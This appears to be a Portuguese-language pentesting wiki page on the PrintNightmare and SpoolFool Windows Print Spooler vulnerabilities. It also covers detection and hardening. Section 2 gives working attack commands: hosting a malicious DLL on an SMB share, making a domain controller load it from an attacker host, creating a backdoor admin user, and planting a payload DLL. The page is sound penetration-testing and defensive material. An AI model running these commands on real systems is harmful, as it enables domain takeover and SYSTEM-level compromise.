# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare é o nome coletivo dado a uma família de vulnerabilidades no serviço **Print Spooler** do Windows que permitem **execução arbitrária de código como SYSTEM** e, quando o spooler está acessível via RPC, **execução remota de código (RCE) em controladores de domínio e servidores de arquivos**. Os CVEs mais explorados são **CVE-2021-1675** (inicialmente classificado como LPE) e **CVE-2021-34527** (RCE completo). Problemas posteriores, como **CVE-2021-34481 (“Point & Print”)** e **CVE-2022-21999 (“SpoolFool”)**, comprovam que a attack surface ainda está longe de estar fechada.

Se você está procurando **authentication coercion / relay** por meio do spooler, em vez de **driver-based RCE/LPE**, consulte [esta outra página sobre printer coercion abuse](printers-spooler-service-abuse.md). Esta página é focada em **carregar drivers / DLLs como SYSTEM**.

---

## 1. Componentes vulneráveis e CVEs

| Ano | CVE | Nome curto | Primitive | Observações |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Corrigido na CU de junho de 2021, mas contornado pelo CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` permite que usuários autenticados carreguem uma DLL de driver a partir de um compartilhamento remoto; após agosto de 2021, isso normalmente exige políticas Point & Print enfraquecidas|
|2021|CVE-2021-34481|“Point & Print”|LPE|Instalação de drivers não assinados por usuários que não são administradores|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Criação arbitrária de diretórios → DLL planting – funciona após os patches de 2021|

Todos eles abusam de um dos **métodos RPC MS-RPRN / MS-PAR** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) ou das relações de confiança dentro do **Point & Print**.

## 2. Técnicas de exploração

### 2.1 Comprometimento remoto de um Domain Controller (CVE-2021-34527)

Um usuário de domínio autenticado, mas **sem privilégios**, pode executar DLLs arbitrárias como **NT AUTHORITY\SYSTEM** em um spooler remoto (frequentemente o DC) por meio de:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
PoCs populares incluem **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) e os módulos `misc::printnightmare / lsa::addsid` de Benjamin Delpy no **mimikatz**.

### 2.2 Escalação de privilégios local (qualquer Windows compatível, 2021-2024)

A mesma API pode ser chamada **localmente** para carregar um driver de `C:\Windows\System32\spool\drivers\x64\3\` e obter privilégios de SYSTEM:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 Triagem moderna em hosts corrigidos

Em um host totalmente atualizado, os PoCs públicos do PrintNightmare geralmente falham porque o Windows agora usa como padrão a **instalação de drivers de impressora somente por administradores** (`RestrictDriverInstallationToAdministrators=1` desde 10 de agosto de 2021). Antes de executar um exploit contra um alvo, verifique primeiro se o ambiente reverteu essa alteração de segurança para implantações de impressoras legadas:<sup>[[3]](#references)</sup>
```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
Os dois valores fracos mais interessantes geralmente são:<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

A partir do Linux, confirme rapidamente que o alvo expõe as interfaces RPC de impressão relevantes antes de executar um PoC:
```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```
Algumas ferramentas públicas mais recentes também oferecem um fluxo de trabalho mais seguro de **check/list** antes de enviar uma DLL:
```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```
> Se você obtiver `RPC_E_ACCESS_DENIED` (`0x8001011b`) como um usuário com poucos privilégios, normalmente estará vendo o padrão pós-2021, e não uma falha de transporte.

> No Windows 11 22H2+ e em versões mais recentes dos clientes, a impressão remota usa **RPC over TCP** por padrão, e **RPC over named pipes** (`\PIPE\spoolss`) fica desabilitado, a menos que seja explicitamente reabilitado. Alguns PoCs antigos e anotações de laboratório ainda presumem que o named pipe está acessível.<sup>[[4]](#references)</sup>

### 2.4 Abuso de Package Point & Print em redes “patched”

Muitos ambientes corporativos permaneceram **vulneráveis por política** após os patches originais de 2021, porque os fluxos de trabalho do helpdesk ou do print server ainda exigiam que usuários não administradores instalassem ou atualizassem drivers. Na prática, o offensive playbook passa a ser:

- Se os prompts de segurança estiverem completamente desabilitados, o **arbitrary-DLL PrintNightmare** clássico ainda é o caminho mais curto.
- Se `Only use Package Point and Print` estiver habilitado, normalmente será necessário fazer pivot para um caminho de **signed package-aware driver**, em vez de um raw DLL drop.<sup>[[3]](#references)</sup>
- Pesquisas de 2024 mostraram que **`Package Point and Print - Approved servers` não é, por si só, uma hard trust boundary**: se um atacante puder fazer spoof ou hijack da resolução de nomes de um approved print server, as vítimas ainda poderão ser redirecionadas para um servidor malicioso que satisfaça as verificações de política.<sup>[[4]](#references)</sup>
- Mesmo combinar UNC hardening com forced RPC-over-SMB pode ser frágil, porque clientes modernos podem **fazer fallback para RPC over TCP**.<sup>[[4]](#references)</sup>

É por isso que a exploração moderna no estilo PrintNightmare geralmente envolve mais **abusar da política corporativa de implantação de impressoras** do que reproduzir o PoC original de 2021 sem alterações.

### 2.5 SpoolFool (CVE-2022-21999) – contornando as correções de 2021

Os patches de 2021 da Microsoft bloquearam o carregamento remoto de drivers, mas **não reforçaram as permissões de diretório**. O SpoolFool abusa do parâmetro `SpoolDirectory` para criar um diretório arbitrário em `C:\Windows\System32\spool\drivers\`, deposita uma DLL de payload e força o spooler a carregá-la:<sup>[[2]](#references)</sup>
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> O exploit funciona em Windows 7 → Windows 11 e Server 2012R2 → 2022 totalmente corrigidos antes das atualizações de fevereiro de 2022<sup>[[2]](#references)</sup>

---

## 3. Detecção e hunting

* **Logs do PrintService** – habilite o canal *Microsoft-Windows-PrintService/Operational* e monitore o **Event ID 316** (driver adicionado/atualizado, geralmente inclui os nomes das DLLs) em tentativas bem-sucedidas e malsucedidas. Combine-o com o **Event ID 808/811** para detectar falhas suspeitas no carregamento de módulos/drivers do spooler.
* **Sysmon** – `Event ID 7` (Image loaded) ou `11/23` (File write/delete) dentro de `C:\Windows\System32\spool\drivers\*` quando o processo pai for **spoolsv.exe**.
* **Linhagem de processos** – gere um alerta sempre que **spoolsv.exe** iniciar `cmd.exe`, `rundll32.exe`, PowerShell ou qualquer processo filho não assinado inesperado.
* **Telemetria de rede** – buscas SMB inesperadas realizadas por `spoolsv.exe` em shares controlados pelo atacante ou tráfego RPC de impressoras incomum originado de servidores que não deveriam atuar como print servers são leads de alto sinal.

## 4. Mitigação e hardening

1. **Aplique os patches!** – aplique a atualização cumulativa mais recente em todos os hosts Windows que tenham o serviço Print Spooler instalado.
2. **Desabilite o spooler onde ele não for necessário**, especialmente em Domain Controllers:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Bloqueie conexões remotas** enquanto ainda permite a impressão local – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Mantenha o Point & Print restrito a administradores** definindo:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Orientações detalhadas na Microsoft KB5005652<sup>[[1]](#references)</sup>
5. Se os requisitos de negócio obrigarem `RestrictDriverInstallationToAdministrators=0`, trate todas as outras políticas de impressora apenas como **mitigação parcial**. No mínimo, prefira **package-aware drivers**, habilite **Only use Package Point and Print** e restrinja **Package Point and Print - Approved servers** a print servers explícitos dentro da forest.<sup>[[3]](#references)</sup>
6. **Não reverta a privacidade do RPC de impressoras** apenas para corrigir mapeamentos de impressoras quebrados. Ambientes que definem `RpcAuthnLevelPrivacyEnabled=0` estão desfazendo o hardening adicionado para o **CVE-2021-1678** e normalmente merecem um escrutínio adicional durante um engagement.<sup>[[4]](#references)</sup>

---

## 5. Pesquisas / ferramentas relacionadas

* Módulos `printnightmare` do [mimikatz](https://github.com/gentilkiwi/mimikatz/tree/master/modules)
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – implementação padrão do Impacket com os modos `-check`, `-list` e `-delete`
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper com entrega SMB integrada, suporte a múltiplos alvos e modos `MS-RPRN` / `MS-PAR`
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – abuso de um driver de impressora vulnerável fornecido pelo atacante por meio do package Point & Print
* Exploit e write-up do SpoolFool
* Micropatches da 0patch para o SpoolFool e outros bugs do spooler

Se quiser **coagir a autenticação** por meio do spooler em vez de carregar um driver, vá para [printer spooler service abuse](printers-spooler-service-abuse.md).

---

## Referências

- [1] [Microsoft – KB5005652: Manage new Point & Print default driver installation behavior](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – A Practical Guide to PrintNightmare in 2024](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – The PrintNightmare is not Over Yet](https://itm4n.github.io/printnightmare-not-over/)

{{#include ../../banners/hacktricks-training.md}}
